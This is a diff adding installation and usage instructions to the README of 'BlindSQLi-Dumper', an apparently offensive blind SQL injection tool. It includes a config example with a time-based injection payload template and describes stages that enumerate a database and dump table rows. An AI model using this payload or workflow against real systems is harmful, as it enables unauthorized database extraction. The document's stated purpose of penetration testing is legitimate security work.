@@ -34,4 +34,57 @@ Unlike standard automated tools, this script allows full control over request he
 
 ### Step 1: Clone the repository
 ```bash
-git clone [https://github.com/MhnXp/BlindSQLi-Dumper.git](https://github.com/YOUR_USERNAME/BlindSQLi-Dumper.git)
+git clone [https://github.com/MhnXp/BlindSQLi-Dumper.git](https://github.com/MhnXp/BlindSQLi-Dumper.git)
+```
+## Step 2: Navigate to directory
+```bash
+cd BlindSQLi-Dumper
+```
+## Step 3: Install dependencies
+```bash
+pip install -r requirements.txt
+```
+## 🚀 How to Use (Step-by-Step Guide)
+Step 1: Configure config.json
+Open config.json and adjust the target parameters, custom headers, and your specific payload:
+```JSON
+{
+  "target_url": "[http://example.com/api/v1/search](http://example.com/api/v1/search)",
+  "method": "POST",
+  "target_param": "query",
+  "injection_type": "time",
+  "time_threshold": 3.0,
+  "success_keyword": "Welcome",
+  "payload_template": "admin' AND IF(({query}), sleep(3), 0)-- -",
+  "headers": {
+    "User-Agent": "Mozilla/5.0",
+    "Content-Type": "application/json",
+    "Authorization": "Bearer YOUR_TOKEN"
+  }
+}
+```
+## Step 2: Run the Script
+Execute the main script using Python:
+```bash
+python dumper.py -c config.json
+```
+## 📋 Interactive Workflow (4 Stages)
+When you run the tool, it guides you interactively through the extraction process across 4 distinct stages:
+
+ Stage 1 - Database Discovery: Automatically extracts the active database name character-by-character (1-50 chars).
+
+ Stage 2 - Table Enumeration: Lists up to 15 tables in the active database with interactive selection indexes ([0] to [14]).
+
+ Stage 3 - Column Extraction: Displays up to 15 available columns inside the selected table.
+
+ Stage 4 - Data Dumping: Dumps the selected columns row-by-row (up to 20 rows per execution run).
+ 
+
+## ⚠️ Disclaimer
+This tool is created strictly for educational purposes and authorized penetration testing. The author assumes no liability for misuse or damage caused by this program.
+
+## 📜 License
+Distributed under the MIT License.
+
+
+
